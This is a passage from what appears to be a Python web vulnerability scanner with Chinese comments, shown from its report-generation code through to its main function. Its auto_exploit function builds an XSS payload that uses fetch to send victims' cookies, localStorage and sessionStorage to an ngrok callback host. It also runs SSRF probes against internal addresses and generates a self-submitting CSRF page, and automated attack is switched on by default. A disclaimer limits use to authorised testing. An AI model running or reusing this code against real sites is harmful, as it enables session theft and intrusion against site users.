            report.append(f"### {result['type'].upper()} 漏洞利用")
            report.append(f"- URL: {result['url']}")
            report.append(f"- 参数: {result['parameter']}")
            report.append(f"- 使用的Payload: {result['payload']}")
            report.append(f"- 利用结果: {result['result']}")
            report.append("")
            
        # 添加免责声明
        report.append("## 免责声明")
        report.append("本报告中的攻击方法仅用于授权的安全测试和研究目的。")
        report.append("在使用这些方法之前，请确保：")
        report.append("1. 您有明确的授权许可")
        report.append("2. 仅在测试环境或授权范围内使用")
        report.append("3. 不要对未授权的目标使用这些方法")
        report.append("4. 遵守相关法律法规和道德准则")
            
        return "\n".join(report)

def setup_listener():
    # 使用ngrok获取公网地址
    try:
        from pyngrok import ngrok
        http_tunnel = ngrok.connect(4444)
        CALLBACK_URL = http_tunnel.public_url
    except:
        CALLBACK_URL = "http://example.com" # 替换为实际的回调地址
    return CALLBACK_URL

def auto_exploit(url, vuln_type, param):
    callback_url = setup_listener()
    
    if vuln_type == "xss":
        # 构造数据窃取payload
        payload = f"""<script>
        fetch('{callback_url}?stolen='+btoa(document.cookie))
        .then(r=>fetch('{callback_url}?stolen='+btoa(localStorage)))
        .then(r=>fetch('{callback_url}?stolen='+btoa(sessionStorage)))
        </script>"""
        
        # 验证payload是否成功执行
        params = {param: payload}
        resp = requests.get(url, params=params)
        if callback_url in resp.text:
            print(f"[+] XSS payload注入成功: {payload}")
            
    elif vuln_type == "ssrf":
        # SSRF探测内网
        internal_urls = [
            "http://localhost",
            "http://127.0.0.1",
            "http://192.168.1.1",
            f"http://{callback_url}"
        ]
        for internal_url in internal_urls:
            params = {param: internal_url}
            try:
                resp = requests.get(url, params=params, timeout=3)
                if resp.status_code == 200:
                    print(f"[+] SSRF成功访问: {internal_url}")
            except:
                continue
                
    elif vuln_type == "csrf":
        # 生成CSRF POC
        csrf_poc = f"""
        <html>
        <body>
        <form action="{url}" method="GET" id="csrf-form">
            <input type="hidden" name="{param}" value="csrf_test" />
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
        </body>
        </html>
        """
        with open("csrf_poc.html", "w") as f:
            f.write(csrf_poc)
        print("[+] 已生成CSRF POC")

def main():
    auto_exploit = True  # 默认开启自动化攻击
    scanner = VulnerabilityScanner(auto_exploit=auto_exploit)
    target_url = input("请输入目标URL: ")
    
    try:
        # 生成带时间戳的报告文件名
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f'scan_report_{timestamp}.md'
        
        # 执行所有类型的扫描
        print("\n[*] 开始全面漏洞扫描...")
        vulns, exploits = scanner.scan_target(target_url)
        
        # 生成报告
        report = scanner.generate_report()
        print("\n" + "="*50 + "\n")
        print(report)
        
        # 保存报告
        with open(report_file, 'w', encoding='utf-8') as f:
            # 添加扫描信息头
            scan_info = f"""# 漏洞扫描报告
扫描时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
目标URL: {target_url}
扫描模式: {'自动化攻击' if auto_exploit else '仅检测'}

"""
            f.write(scan_info + report)
        print(f"\n报告已保存到 {report_file}")
        
        # 显示扫描统计
        print("\n扫描统计:")
        print(f"- 发现漏洞: {len(vulns)} 个")
        print(f"- 成功利用: {len(exploits)} 个")
        vuln_types = {}
        for v in vulns:
            vuln_types[v['type']] = vuln_types.get(v['type'], 0) + 1
        print("\n漏洞类型统计:")
        for vtype, count in vuln_types.items():
            print(f"- {vtype}: {count} 个")
        
    except Exception as e:
        print(f"扫描过程中出错: {str(e)}")

if __name__ == '__main__':
    main() 